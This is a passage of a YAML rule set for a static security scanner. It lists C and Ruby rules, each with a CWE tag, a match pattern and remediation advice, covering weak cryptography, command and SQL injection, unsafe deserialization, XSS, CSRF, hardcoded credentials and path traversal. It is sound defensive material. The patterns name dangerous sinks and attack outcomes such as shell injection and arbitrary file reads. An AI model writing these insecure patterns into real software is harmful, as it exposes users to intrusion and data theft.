rule:
  kind: function_call
  pattern: EVP_*_ecb OR AES_set_encrypt_key with ECB
note: 'ECB (Electronic Codebook) mode reveals patterns in plaintext. Identical

  plaintext blocks encrypt to identical ciphertext blocks.


  Remediation: Use CBC, GCM, or CTR mode.

  '
---
id: c-cwe-329-missing-iv
language: c
severity: warning
message: 'CWE-329: Missing or weak IV with CBC mode'
tags:
- security
- cryptography
- CWE-329
rule:
  kind: function_call
  pattern: Encryption without IV initialization
note: 'Missing or predictable IV weakens encryption. Each encryption must have

  unique, random IV.


  Remediation: Generate random IV for each encryption, prepend to ciphertext.

  '
---
id: c-cwe-327-insecure-ssl-tls
language: c
severity: warning
message: 'CWE-327: Insecure SSL/TLS version'
tags:
- security
- cryptography
- CWE-327
rule:
  kind: function_call
  pattern: SSLv2_method() OR SSLv3_method() OR TLSv1_method()
note: 'Old TLS versions have known vulnerabilities: POODLE (SSLv3), heartbleed (TLSv1).


  Remediation: Use TLS_method() with minimum TLS 1.2, prefer TLS 1.3.

  '
---
id: c-cwe-295-disabled-cert-verification
language: c
severity: error
message: 'CWE-295: Improper certificate validation'
tags:
- security
- cryptography
- CWE-295
- OWASP-A2
rule:
  kind: function_call
  pattern: SSL_CTX_set_verify($CTX, SSL_VERIFY_NONE, ...)
note: 'Disabling certificate verification enables man-in-the-middle attacks.


  Remediation: Use SSL_VERIFY_PEER with proper certificate validation callback.

  '
---
id: c-cwe-770-alloca-stack
language: c
severity: medium
message: 'CWE-770: Unbounded allocation via alloca'
tags:
- security
- dangerous-function
- CWE-770
rule:
  kind: function_call
  pattern: alloca($USER_SIZE)
note: 'Large or user-controlled alloca can cause stack overflow and crash.


  Remediation: Use malloc with size limits or fixed-size arrays.

  '
---
id: c-cwe-770-variable-length-array
language: c
severity: medium
message: 'CWE-770: Variable length array (VLA) with user-controlled size'
tags:
- security
- dangerous-function
- CWE-770
rule:
  kind: array_declaration
  pattern: char $ARR[$USER_SIZE]
note: 'VLAs can exhaust stack with large sizes, causing stack overflow.


  Remediation: Use heap allocation (malloc) with size limits.

  '
---
id: c-cwe-377-mktemp-race
language: c
severity: warning
message: 'CWE-377: Insecure temporary file - mktemp'
tags:
- security
- dangerous-function
- CWE-377
rule:
  kind: function_call
  pattern: mktemp($TEMPLATE)
note: 'Race condition between name generation and file creation. Attacker can

  create symlink with that name.


  Remediation: Use mkstemp which creates file atomically and securely.

  '
---
id: c-cwe-377-tmpnam
language: c
severity: warning
message: 'CWE-377: Insecure temporary file - tmpnam'
tags:
- security
- dangerous-function
- CWE-377
rule:
  kind: function_call
  pattern: tmpnam($BUF)
note: 'Same race condition as mktemp. Deprecated function.


  Remediation: Use tmpfile() or mkstemp().

  '
---
id: c-cwe-377-tempnam
language: c
severity: warning
message: 'CWE-377: Insecure temporary file - tempnam'
tags:
- security
- dangerous-function
- CWE-377
rule:
  kind: function_call
  pattern: tempnam($DIR, $PREFIX)
note: 'Deprecated with same security issues as mktemp/tmpnam.


  Remediation: Use mkstemp().

  '
---
id: c-cwe-271-privilege-drop
language: c
severity: warning
message: 'CWE-271: Privilege dropping/lowering errors'
tags:
- security
- dangerous-function
- CWE-271
rule:
  kind: expression
  pattern: setuid program without privilege dropping
note: 'Running with elevated privileges unnecessarily increases attack surface.


  Remediation: Drop privileges as soon as possible using setuid/setgid.

  '
---
id: c-cwe-252-unchecked-setuid
language: c
severity: warning
message: 'CWE-252, CWE-273: Unchecked setuid return value'
tags:
- security
- dangerous-function
- CWE-252
- CWE-273
rule:
  kind: function_call
  pattern: setuid($UID) without return check
note: 'setuid can fail (no such user, permission denied). Checking failure is

  critical - process may still have elevated privileges.


  Remediation: Check return value and abort on failure.

  '
---
id: c-cwe-843-unsafe-type-cast
language: c
severity: warning
message: 'CWE-843: Access of resource using incompatible type'
tags:
- security
- type-confusion
- CWE-843
rule:
  kind: cast
  pattern: C-style cast to incompatible pointer type
note: 'Casting to wrong type causes memory corruption and undefined behavior.


  Remediation: Use proper types, use dynamic_cast in C++.

  '
---
id: c-cwe-843-union-type-confusion
language: c
severity: medium
message: 'CWE-843: Union type confusion'
tags:
- security
- type-confusion
- CWE-843
rule:
  kind: member_access
  pattern: Union member accessed after writing different member
note: 'Type punning via unions causes undefined behavior and memory corruption.


  Remediation: Use std::variant in C++ or type-safe alternatives.

  '
---
id: c-cwe-843-void-pointer-cast
language: c
severity: medium
message: 'CWE-843: Void pointer cast without validation'
tags:
- security
- type-confusion
- CWE-843
rule:
  kind: cast
  pattern: ($TYPE *)$VOID_PTR without type checking
note: 'void* can hold any pointer. Casting to wrong type is undefined behavior.


  Remediation: Track types with tagged unions or type field (discriminator).

  '
---
id: c-cwe-479-non-async-safe-signal-handler
language: c
severity: warning
message: 'CWE-479: Signal handler use of non-reentrant function'
tags:
- security
- signal-handler
- CWE-479
rule:
  kind: function_call
  pattern: printf/malloc/exit in signal handler
note: 'Non-async-safe functions in signal handlers can deadlock or corrupt state.

  Signal can interrupt same function causing reentrancy issues.


  Remediation: Only use async-signal-safe functions (write, _exit, signal).

  '
---
id: c-cwe-479-signal-handler-global
language: c
severity: medium
message: 'CWE-479, CWE-662: Signal handler modifying non-volatile global'
tags:
- security
- signal-handler
- CWE-479
- CWE-662
rule:
  kind: assignment
  pattern: Signal handler modifying non-volatile sig_atomic_t global
note: 'Without volatile sig_atomic_t, compiler may optimize away updates or

  cache in register, making updates invisible to other code paths.


  Remediation: Use volatile sig_atomic_t for signal-handler-modified flags.

  '
---
id: c-cwe-732-insecure-file-permissions
language: c
severity: medium
message: 'CWE-732: Incorrect permission assignment'
tags:
- security
- file-operation
- CWE-732
rule:
  kind: function_call
  pattern: open($PATH, O_CREAT, 0777)
note: 'World-writable files are accessible to any user. Dangerous for sensitive files.


  Remediation: Use restrictive permissions (0600 for owner only, 0640 for owner+group).

  '
---
id: c-cwe-732-umask-not-set
language: c
severity: low
message: 'CWE-732: Insufficient permission assignment via umask'
tags:
- security
- file-operation
- CWE-732
rule:
  kind: expression
  pattern: File creation without umask() call
note: 'File creation relies on process umask which may be permissive. Better to

  set explicit permissions.


  Remediation: Set umask or use explicit mode in open().

  '
---
id: c-cwe-404-unlink-before-close
language: c
severity: low
message: 'CWE-404: Improper resource shutdown'
tags:
- security
- file-operation
- CWE-404
rule:
  kind: function_call
  pattern: unlink($PATH) before close($FD)
note: 'Can cause race condition or resource leak.


  Remediation: Close file descriptor before unlinking.

  '
---
id: c-cwe-252-no-chdir-check
language: c
severity: medium
message: 'CWE-252: Unchecked return value from chdir'
tags:
- security
- file-operation
- CWE-252
rule:
  kind: function_call
  pattern: chdir($PATH) without return check
note: 'Failed chdir leaves process in wrong directory, security-critical state.


  Remediation: Check return value and abort if security-relevant.

  '
---
id: c-cwe-426-untrusted-environment-variable
language: c
severity: warning
message: 'CWE-426: Untrusted search path from environment'
tags:
- security
- environment
- CWE-426
rule:
  kind: function_call
  pattern: getenv("PATH") OR getenv("LD_PRELOAD") used unsafely
note: 'Environment variables can be controlled by attacker. Dangerous in setuid programs.

  LD_PRELOAD allows loading malicious shared libraries.


  Remediation: Sanitize or ignore dangerous env vars. Setuid programs should

  clear environment or use whitelist.

  '
---
id: c-cwe-835-unbounded-loop
language: c
severity: medium
message: 'CWE-835: Loop with unreachable exit condition'
tags:
- security
- denial-of-service
- CWE-835
rule:
  kind: loop
  pattern: while (read(...) > 0) without size limit
note: 'Attacker can cause infinite loop with crafted input, leading to DoS.


  Remediation: Add maximum iteration count or total bytes limit.

  '
---
id: c-cwe-528-sensitive-data-core-dump
language: c
severity: medium
message: 'CWE-528: Exposure of core dump file'
tags:
- security
- information-disclosure
- CWE-528
rule:
  kind: expression
  pattern: Passwords/keys not cleared from memory
note: 'Core dumps can expose sensitive data like passwords and encryption keys

  still in memory.


  Remediation: Use mlock() to prevent core dumps, explicit_bzero() to clear memory,

  or disable core dumps.

  '
---
id: c-cwe-617-assert-security-check
language: c
severity: warning
message: 'CWE-617: Reachable assertion'
tags:
- security
- logic-error
- CWE-617
rule:
  kind: function_call
  pattern: assert($SECURITY_CHECK)
note: 'Asserts are completely removed from release builds (-DNDEBUG). Security

  checks must use explicit if-statements.


  Remediation: Use explicit if-check with error handling instead of assert.

  '
---
id: c-cwe-477-obsolete-function
language: c
severity: medium
message: 'CWE-477: Use of obsolete function'
tags:
- security
- dangerous-function
- CWE-477
rule:
  kind: function_call
  pattern: bcopy OR bzero OR index OR rindex
note: 'These functions are deprecated. Modern equivalents: memcpy, memset, strchr,
  strrchr.

  May have subtle bugs or be unavailable on some platforms.


  Remediation: Use memcpy, memset, strchr, strrchr.

  '
---
id: c-cwe-129-unchecked-array-index
language: c
severity: warning
message: 'CWE-129: Improper validation of array index'
tags:
- security
- array-bounds
- CWE-129
rule:
  kind: array_access
  pattern: $ARR[$USER_INDEX] without bounds check
note: 'Out-of-bounds access can read/write arbitrary memory. Leads to information

  disclosure or code execution.


  Remediation: Validate index is within [0, array_size).

  '
---
id: c-cwe-193-off-by-one
language: c
severity: warning
message: 'CWE-193: Off-by-one error'
tags:
- security
- array-bounds
- CWE-193
rule:
  kind: expression
  pattern: for (i = 0; i <= $LEN; i++) accessing array
note: 'Iterating one past array end causes out-of-bounds access.


  Remediation: Use < instead of <=, i.e., for (i = 0; i < len; i++).

  '
---
id: c-cwe-562-return-stack-address
language: c
severity: error
message: 'CWE-562: Return of stack variable address'
tags:
- security
- memory-safety
- CWE-562
- OWASP-A4
rule:
  kind: return_statement
  pattern: return &$LOCAL_VAR OR return pointer to local array
note: 'Stack memory becomes invalid after function returns. Returning pointer to it

  leads to use-after-free in caller.


  Remediation: Use static allocation, heap allocation, or output parameter.

  '
---
id: c-cwe-170-improper-null-termination
language: c
severity: warning
message: 'CWE-170: Improper null termination'
tags:
- security
- buffer-overflow
- CWE-170
rule:
  kind: function_call
  pattern: strncpy without explicit null termination
note: 'strncpy doesn''t null-terminate if source is >= n bytes. String functions

  expect null-termination.


  Remediation: Always add buf[sizeof(buf)-1] = ''\0''; after strncpy.

  '
---
id: c-cwe-676-strtok-usage
language: c
severity: medium
message: 'CWE-676: Use of potentially dangerous function - strtok'
tags:
- security
- dangerous-function
- CWE-676
rule:
  kind: function_call
  pattern: strtok($STR, $DELIM)
note: 'strtok is not thread-safe and modifies input string. Not reentrant.


  Remediation: Use strtok_r (reentrant version) or implement custom parsing.

  '
---
id: c-cwe-489-debug-code
language: c
severity: medium
message: 'CWE-489: Active debug code'
tags:
- security
- information-disclosure
- CWE-489
rule:
  kind: preprocessor
  pattern: '#ifdef DEBUG blocks in production code'
note: 'Debug code may expose sensitive information or provide privileged access.


  Remediation: Remove debug code before release, or guard with runtime flag.

  '
---
id: c-cwe-798-hardcoded-credentials
language: c
severity: error
message: 'CWE-798: Use of hard-coded credentials'
tags:
- security
- credential
- CWE-798
- OWASP-A2
rule:
  kind: variable_declaration
  pattern: password/passwd/secret/apikey string literals
note: 'Credentials in source code can be extracted via reverse engineering or

  git history.


  Remediation: Use configuration files, environment variables, or secrets vault.

  '
---
id: c-cwe-331-insufficient-entropy
language: c
severity: warning
message: 'CWE-331: Insufficient entropy in random number generation'
tags:
- security
- cryptography
- CWE-331
rule:
  kind: function_call
  pattern: srand(getpid()) OR srand(0)
note: 'Predictable seed (PID, 0) leads to predictable random numbers. getpid()

  is known to attacker.


  Remediation: Use /dev/urandom or cryptographic RNG.

  '
---
id: c-cwe-94-dlopen-code-injection
language: c
severity: error
message: 'CWE-94: Code injection via dlopen'
tags:
- security
- code-injection
- CWE-94
- OWASP-A3
rule:
  kind: function_call
  pattern: dlopen($USER_PATH, ...)
note: 'Loading user-controlled library path allows arbitrary code execution.


  Remediation: Use allowlist of paths, validate input strictly, use RTLD_DEEPBIND.

  '
---
id: c-cwe-403-file-descriptor-leak
language: c
severity: medium
message: 'CWE-403: Exposure of file descriptor'
tags:
- security
- file-operation
- CWE-403
rule:
  kind: function_call
  pattern: exec without closing sensitive file descriptors
note: 'Child process inherits open file descriptors from parent. Can expose

  sensitive files or network connections.


  Remediation: Use O_CLOEXEC flag or fcntl(fd, F_SETFD, FD_CLOEXEC).

  '
---
id: c-cwe-120-sprintf-overlap
language: c
severity: warning
message: 'CWE-120: sprintf to same buffer causing overlap'
tags:
- security
- buffer-overflow
- CWE-120
rule:
  kind: function_call
  pattern: sprintf($BUF, "...%s...", $BUF)
note: 'Source and destination overlap. Undefined behavior, buffer corruption.


  Remediation: Use temporary buffer or snprintf with separate source.

  '
---
id: c-cwe-467-sizeof-pointer
language: c
severity: warning
message: 'CWE-467: Use of sizeof on pointer type'
tags:
- security
- logic-error
- CWE-467
rule:
  kind: expression
  pattern: sizeof($PTR) used as array size
note: 'sizeof pointer is 4 or 8 bytes, not the array size. Common mistake.

  Example: char *arr = malloc(sizeof(arr) * 10); // allocates 40-80 bytes, not 10*elementsize


  Remediation: Track array size separately or use sizeof(array) for static arrays.

  '
---
id: c-cwe-478-missing-default-switch
language: c
severity: medium
message: 'CWE-478: Missing default case in switch'
tags:
- security
- logic-error
- CWE-478
rule:
  kind: switch_statement
  pattern: Switch on security-sensitive value without default
note: 'Unhandled case may bypass security checks or leave state undefined.


  Remediation: Always include default case with error handling.

  '
---
id: ruby-cwe-94-dangerous-eval
language: ruby
severity: error
message: 'CWE-94: Dangerous eval() Usage - executes arbitrary Ruby code'
tags:
- security
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: eval($INPUT)
note: 'eval() executes arbitrary Ruby code. When combined with user input or

  dynamic expressions, it enables Remote Code Execution (RCE).


  FIX: Avoid eval entirely. Use safer alternatives:

  - JSON.parse for JSON data

  - YAML.safe_load for YAML with permitted_classes

  - Domain-specific parsers (domain language instead of general eval)

  '
---
id: ruby-cwe-94-instance-eval-injection
language: ruby
severity: error
message: 'CWE-94: instance_eval with User Input - enables attribute manipulation'
tags:
- security
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: $OBJ.instance_eval($USER_INPUT)
note: 'instance_eval executes code in the context of an object, allowing

  manipulation of attributes and method invocation.


  FIX: Use explicit method calls or whitelisted operations instead

  of dynamic evaluation.

  '
---
id: ruby-cwe-94-class-eval-injection
language: ruby
severity: error
message: 'CWE-94: class_eval/module_eval with Dynamic Input - runtime class modification'
tags:
- security
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: $CLASS.class_eval($INPUT)
note: 'class_eval and module_eval modify class definitions at runtime,

  enabling arbitrary code injection.


  FIX: Use define_method with controlled parameters instead.

  '
---
id: ruby-cwe-94-binding-eval
language: ruby
severity: error
message: 'CWE-94: binding.eval() Injection - executes code with local access'
tags:
- security
- code-injection
- CWE-94
- OWASP-Injection
rule:
  kind: method_call
  pattern: binding.eval($INPUT)
note: 'binding.eval executes code within a specific binding context,

  accessing local variables and methods.


  FIX: Never pass untrusted input to binding.eval.

  '
---
id: ruby-cwe-502-unsafe-marshal-load
language: ruby
severity: error
message: 'CWE-502: Unsafe Marshal.load - deserialization of untrusted data'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: method_call
  pattern: Marshal.load($INPUT)
note: 'Marshal.load can instantiate arbitrary objects and execute code during

  deserialization. One of Ruby''s most dangerous vulnerabilities.


  FIX:

  - Never unmarshal untrusted data

  - Use JSON or MessagePack for data exchange

  - Implement custom serialization with whitelisted classes


  REFERENCES: CVE-2013-0156 (Rails Marshal vulnerability)

  '
---
id: ruby-cwe-502-unsafe-yaml-load
language: ruby
severity: error
message: 'CWE-502: Unsafe YAML.load - object instantiation leading to RCE'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: method_call
  pattern: YAML.load($INPUT)
note: 'YAML deserialization can instantiate arbitrary Ruby objects,

  leading to Remote Code Execution (RCE).


  FIX: Use YAML.safe_load with permitted_classes parameter:

  YAML.safe_load(data, permitted_classes: [Symbol, Date])


  REFERENCES: CVE-2013-0156

  '
---
id: ruby-cwe-502-unsafe-json-load-legacy
language: ruby
severity: warning
message: 'CWE-502: JSON.load with proc parameter - arbitrary code execution during
  parsing'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: method_call
  pattern: JSON.load($INPUT, $PROC)
note: 'JSON.load with a proc parameter can execute arbitrary code

  during parsing.


  FIX: Use JSON.parse instead, which is safe by default.

  '
---
id: ruby-cwe-502-oj-unsafe-mode
language: ruby
severity: error
message: 'CWE-502: Oj Unsafe Mode - object deserialization vulnerability'
tags:
- security
- deserialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: method_call
  pattern: 'Oj.load($INPUT, mode: :object)'
note: 'Oj in object mode can deserialize arbitrary Ruby objects.


  FIX: Use :strict or :null mode:

  Oj.load(data, mode: :strict)

  '
---
id: ruby-cwe-78-backtick-injection
language: ruby
severity: error
message: 'CWE-78: Backtick Command Execution - OS command injection vulnerability'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: string_literal
  pattern: '`#{$USER_INPUT}`'
note: 'Backticks execute shell commands. Interpolated user input enables

  command injection.


  FIX: Use Open3.capture3 with proper argument separation:

  Open3.capture3(''command'', user_input)

  '
---
id: ruby-cwe-78-system-injection
language: ruby
severity: error
message: 'CWE-78: system() with User Input - shell invocation vulnerability'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: system($USER_INPUT)
note: 'system() with a single string argument invokes shell, enabling injection.


  FIX: Use array form which bypasses shell:

  system(''ls'', ''-la'', user_path)  # Safe - no shell

  '
---
id: ruby-cwe-78-exec-injection
language: ruby
severity: error
message: 'CWE-78: exec() with User Input - process replacement vulnerability'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: exec($USER_INPUT)
note: 'exec() replaces the current process with a new command.

  Injection leads to RCE.


  FIX: Use array form: exec(''cmd'', ''arg1'', ''arg2'')

  '
---
id: ruby-cwe-78-spawn-injection
language: ruby
severity: error
message: 'CWE-78: spawn() with Shell Metacharacters - process spawning vulnerability'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: spawn($USER_INPUT)
note: 'spawn() with string form invokes shell when string contains metacharacters.


  FIX: Use array form: spawn(''cmd'', ''arg1'')

  '
---
id: ruby-cwe-78-open3-string-form
language: ruby
severity: error
message: 'CWE-78: Open3 String Form - shell invocation in process management'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: 'Open3.capture3("#{$CMD} #{$VAR}")'
note: 'String form of Open3 methods invokes shell.


  FIX: Use array form: Open3.capture3(''cmd'', user_input)

  '
---
id: ruby-cwe-78-kernel-backtick
language: ruby
severity: error
message: 'CWE-78: Dangerous Kernel.` Method - direct backtick invocation'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: Kernel.`($USER_INPUT)
note: 'Direct backtick method invocation enables command injection.


  FIX: Avoid entirely; use Open3 with array arguments.

  '
---
id: ruby-cwe-78-io-popen-injection
language: ruby
severity: error
message: 'CWE-78: IO.popen Injection - process spawning vulnerability'
tags:
- security
- command-injection
- CWE-78
- OWASP-Injection
rule:
  kind: method_call
  pattern: IO.popen($USER_INPUT)
note: 'IO.popen with string form invokes shell.


  FIX: Use array form: IO.popen([''cmd'', ''arg''])

  '
---
id: ruby-cwe-89-sql-injection-interpolation
language: ruby
severity: error
message: 'CWE-89: ActiveRecord Raw SQL with Interpolation - SQL injection vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.where("#{$EXPR}")
note: 'String interpolation in SQL queries enables SQL injection.


  FIX: Use parameterized queries:

  Model.where("column = ?", user_input)

  Model.where(column: user_input)

  '
---
id: ruby-cwe-89-sql-injection-order
language: ruby
severity: error
message: 'CWE-89: Dangerous order() Method - column name injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.order($USER_INPUT)
note: 'order() often receives unsanitized column names from user input.


  FIX: Whitelist allowed columns:

  ALLOWED_COLUMNS = %w[name created_at].freeze

  Model.order(params[:sort]) if ALLOWED_COLUMNS.include?(params[:sort])

  '
---
id: ruby-cwe-89-sql-injection-pluck
language: ruby
severity: error
message: 'CWE-89: Dangerous pluck() with User Input - column selection injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.pluck($USER_INPUT)
note: 'pluck() with user input can enable column name injection.


  FIX: Whitelist column names before using in pluck.

  '
---
id: ruby-cwe-89-sql-injection-group
language: ruby
severity: error
message: 'CWE-89: group() SQL Injection - grouping clause vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.group($USER_INPUT)
note: 'group() with user input can enable SQL injection.


  FIX: Whitelist or use symbols for column names.

  '
---
id: ruby-cwe-89-sql-injection-select
language: ruby
severity: error
message: 'CWE-89: select() SQL Injection - column selection vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.select($USER_INPUT)
note: 'select() with user input can enable SQL injection.


  FIX: Use symbol-based selection or whitelist fields.

  '
---
id: ruby-cwe-89-sql-injection-joins
language: ruby
severity: error
message: 'CWE-89: joins() SQL Injection - join clause vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.joins($USER_INPUT)
note: 'joins() with user input can enable SQL injection.


  FIX: Use symbolic associations: Model.joins(:association)

  '
---
id: ruby-cwe-89-sql-injection-from
language: ruby
severity: error
message: 'CWE-89: from() SQL Injection - table name injection vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.from($USER_INPUT)
note: 'from() with user input enables SQL injection via table name manipulation.


  FIX: Never allow user input in table names.

  '
---
id: ruby-cwe-89-sql-injection-having
language: ruby
severity: error
message: 'CWE-89: having() SQL Injection - aggregate clause vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: $MODEL.having($USER_INPUT)
note: 'having() with user input can enable SQL injection.


  FIX: Use parameterized form: having("count > ?", count)

  '
---
id: ruby-cwe-89-sql-injection-execute
language: ruby
severity: error
message: 'CWE-89: execute() Raw SQL - direct SQL execution vulnerability'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: connection.execute("#{$SQL}")
note: 'execute() with string interpolation enables direct SQL injection.


  FIX: Use ActiveRecord query interface or sanitize:

  connection.execute(ActiveRecord::Base.sanitize_sql([''SELECT * FROM t WHERE c =
  ?'', value]))

  '
---
id: ruby-cwe-89-arel-sql-injection
language: ruby
severity: error
message: 'CWE-89: Arel.sql() Literal Injection - SQL escaping bypass'
tags:
- security
- sql-injection
- CWE-89
- OWASP-Injection
rule:
  kind: method_call
  pattern: Arel.sql($USER_INPUT)
note: 'Arel.sql marks strings as safe SQL, bypassing escaping.

  Never pass user input to Arel.sql.


  FIX: Only use Arel.sql with hardcoded SQL expressions.

  '
---
id: ruby-cwe-79-xss-html-safe
language: ruby
severity: error
message: 'CWE-79: html_safe on User Input - Cross-Site Scripting vulnerability'
tags:
- security
- xss
- CWE-79
- OWASP-Injection
rule:
  kind: method_call
  pattern: $USER_INPUT.html_safe
note: 'html_safe marks strings as safe HTML, disabling auto-escaping.


  FIX: Only use on truly safe static content. For dynamic content,

  use proper sanitization:

  sanitize(user_input, tags: %w[b i])

  '
---
id: ruby-cwe-79-xss-raw
language: ruby
severity: error
message: 'CWE-79: raw() Helper with User Input - unescaped HTML output'
tags:
- security
- xss
- CWE-79
- OWASP-Injection
rule:
  kind: method_call
  pattern: raw($USER_INPUT)
note: 'raw() outputs unescaped HTML.


  FIX: Remove raw() or use sanitize().

  '
---
id: ruby-cwe-79-xss-erb-bypass
language: ruby
severity: warning
message: 'CWE-79: ERB Double Equals Syntax - escaping bypass in templates'
tags:
- security
- xss
- CWE-79
- OWASP-Injection
rule:
  kind: template_expression
  pattern: <%== $USER_INPUT %>
note: 'Double-equals (==) in ERB disables auto-escaping.


  FIX: Use single equals: <%= user_input %>

  '
---
id: ruby-cwe-79-xss-content-tag
language: ruby
severity: error
message: 'CWE-79: content_tag with Unsafe Options - helper XSS vulnerability'
tags:
- security
- xss
- CWE-79
- OWASP-Injection
rule:
  kind: method_call
  pattern: 'content_tag($TAG, $USER_INPUT, escape: false)'
note: 'content_tag with escape: false disables escaping.


  FIX: Remove escape: false or use sanitize().

  '
---
id: ruby-cwe-79-xss-link-to
language: ruby
severity: warning
message: 'CWE-79: link_to with Unescaped Content - link text XSS'
tags:
- security
- xss
- CWE-79
- OWASP-Injection
rule:
  kind: method_call
  pattern: link_to($USER_INPUT.html_safe, $URL)
note: 'Marking link text as html_safe enables XSS.


  FIX: Don''t mark link text as html_safe with user input.

  '
---
id: ruby-cwe-79-xss-render-inline
language: ruby
severity: error
message: 'CWE-79: render inline with User Input - template injection and RCE'
tags:
- security
- xss
- code-injection
- CWE-79
- OWASP-Injection
rule:
  kind: method_call
  pattern: 'render inline: $USER_INPUT'
note: 'Rendering inline templates with user input enables XSS and

  potentially RCE.


  FIX: Never render user-controlled templates. Use proper view files.

  '
---
id: ruby-cwe-352-csrf-disabled
language: ruby
severity: error
message: 'CWE-352: protect_from_forgery Disabled - CSRF vulnerability'
tags:
- security
- csrf
- CWE-352
- OWASP-CSRF
rule:
  kind: method_call
  pattern: skip_before_action :verify_authenticity_token
note: 'Disabling CSRF protection enables cross-site request forgery attacks.


  FIX: Enable CSRF protection. For APIs, use alternative authentication:

  protect_from_forgery with: :exception

  '
---
id: ruby-cwe-352-csrf-token-exposure
language: ruby
severity: warning
message: 'CWE-352: CSRF Token Exposure - token disclosure in API response'
tags:
- security
- csrf
- CWE-352
- OWASP-CSRF
rule:
  kind: method_call
  pattern: form_authenticity_token
note: 'CSRF tokens should not be exposed in JSON API responses.


  FIX: Don''t expose CSRF tokens outside of HTML forms.

  '
---
id: ruby-cwe-915-mass-assignment-permit-all
language: ruby
severity: error
message: 'CWE-915: permit! Without Whitelist - mass assignment vulnerability'
tags:
- security
- mass-assignment
- CWE-915
- OWASP-MassAssignment
rule:
  kind: method_call
  pattern: params.permit!
note: 'permit! allows all parameters, enabling mass assignment attacks

  where attackers can modify admin fields.


  FIX: Explicitly whitelist allowed parameters:

  params.require(:user).permit(:name, :email)

  '
---
id: ruby-cwe-915-legacy-mass-assignment
language: ruby
severity: warning
message: 'CWE-915: Legacy attr_accessible/attr_protected - deprecated protection'
tags:
- security
- mass-assignment
- CWE-915
- OWASP-MassAssignment
rule:
  kind: attribute_declaration
  pattern: attr_accessible :$ATTRS
note: 'Legacy Rails 3 mass assignment protection, deprecated in Rails 4+.


  FIX: Migrate to Strong Parameters (params.permit).

  '
---
id: ruby-cwe-915-direct-params-assignment
language: ruby
severity: error
message: 'CWE-915: Direct Assignment from Params - Strong Parameters bypass'
tags:
- security
- mass-assignment
- CWE-915
- OWASP-MassAssignment
rule:
  kind: method_call
  pattern: $MODEL.new(params)
note: 'Passing params directly bypasses Strong Parameters protection.


  FIX: Always use permit():

  Model.create(params.require(:model).permit(:name, :email))

  '
---
id: ruby-cwe-601-open-redirect
language: ruby
severity: warning
message: 'CWE-601: redirect_to with User Input - open redirect vulnerability'
tags:
- security
- open-redirect
- CWE-601
- OWASP-OpenRedirect
rule:
  kind: method_call
  pattern: redirect_to params[$KEY]
note: "Redirecting to user-controlled URLs enables phishing attacks.\n\nFIX: Validate\
  \ redirect URLs against whitelist:\ndef safe_redirect(url)\n  uri = URI.parse(url)\n\
  \  return root_path unless ALLOWED_HOSTS.include?(uri.host)\n  url\nend\n"
---
id: ruby-cwe-601-redirect-back-fallback
language: ruby
severity: info
message: 'CWE-601: redirect_back Fallback - potential open redirect'
tags:
- security
- open-redirect
- CWE-601
- OWASP-OpenRedirect
rule:
  kind: method_call
  pattern: 'redirect_back fallback_location: params[$KEY]'
note: 'User-controlled fallback locations can enable open redirect.


  FIX: Use static fallback locations.

  '
---
id: ruby-cwe-22-path-traversal-send-file
language: ruby
severity: error
message: 'CWE-22: Path Traversal in send_file - arbitrary file disclosure'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: method_call
  pattern: send_file params[$KEY]
note: "Path traversal allows reading arbitrary files (e.g., /etc/passwd).\n\nFIX:\
  \ Validate file paths:\ndef safe_file_path(filename)\n  safe_name = File.basename(filename)\
  \  # Strip directory components\n  File.join(UPLOADS_DIR, safe_name)\nend\n"
---
id: ruby-cwe-22-path-traversal-file-read
language: ruby
severity: error
message: 'CWE-22: Path Traversal in File.read - arbitrary file access'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: method_call
  pattern: File.read(params[$KEY])
note: 'File.read with user input enables path traversal attacks.


  FIX: Canonicalize and validate paths:

  path = File.expand_path(user_input, SAFE_DIR)

  raise unless path.start_with?(SAFE_DIR)

  '
---
id: ruby-cwe-22-fileutils-path-traversal
language: ruby
severity: error
message: 'CWE-22: FileUtils with User Input - dangerous file operations'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: method_call
  pattern: FileUtils.rm($USER_INPUT)
note: 'FileUtils operations with user input enable path traversal and

  unintended file deletion.


  FIX: Validate paths before file operations.

  '
---
id: ruby-cwe-732-tempfile-permissions
language: ruby
severity: warning
message: 'CWE-732: Tempfile Insecure Permissions - world-readable temporary files'
tags:
- security
- permissions
- CWE-732
- OWASP-FileManagement
rule:
  kind: method_call
